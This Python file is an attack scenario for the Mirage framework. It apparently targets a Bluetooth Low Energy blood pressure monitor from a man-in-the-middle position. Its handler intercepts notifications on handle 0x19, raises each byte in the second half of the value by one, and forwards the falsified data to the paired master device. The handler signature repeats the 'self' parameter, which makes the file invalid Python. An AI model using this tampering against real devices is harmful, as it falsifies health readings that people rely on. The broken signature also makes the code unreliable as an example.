from mirage.core import scenario
from mirage.libs import io, ble, bt, utils

class bpm(scenario.Scenario):
    def onStart(self):
        # This signal is triggered when the module starts
        self.a2sEmitter = self.module.a2sEmitter  # Attacker to Slave emitter
        self.a2sReceiver = self.module.a2sReceiver  # Attacker to Slave receiver
        self.a2mEmitter = self.module.a2mEmitter  # Attacker to Master emitter
        self.a2mReceiver = self.module.a2mReceiver  # Attacker to Master receiver
        self.first_if_executed = False  # Flag to indicate whether the first if statement is executed
        return True  # The default behaviour is executed

    def onSlaveHandleValueNotification(self, self, packet):
        # Check if the packet handle is 0x19 and its value starts with 0x32
        if packet.handle == 0x19 and packet.value and packet.value.startswith(b'\x32'):
            # Split the packet value into two halves
            half_len = len(packet.value) // 2
            first_half = packet.value[:half_len]
            second_half = packet.value[half_len:]

            # Increment each byte in the second half by 0x01
            incremented_second_half = bytes(((byte + 1) & 0xFF for byte in second_half))

            # Concatenate the first half with the incremented second half
            incremented_value = first_half + incremented_second_half

            # Display the original and incremented values
            io.info("---------Original value: " + packet.value.hex() + " !")
            io.info("---------Value with second half incremented by 01: " + incremented_value.hex() + " !")

            # Send the modified packet
            self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle, value=incremented_value))

            return False  # Prevent the default behaviour from executing

        return True  # Execute the default behaviour

    def onEnd(self):
        return True  # The default behaviour is executed
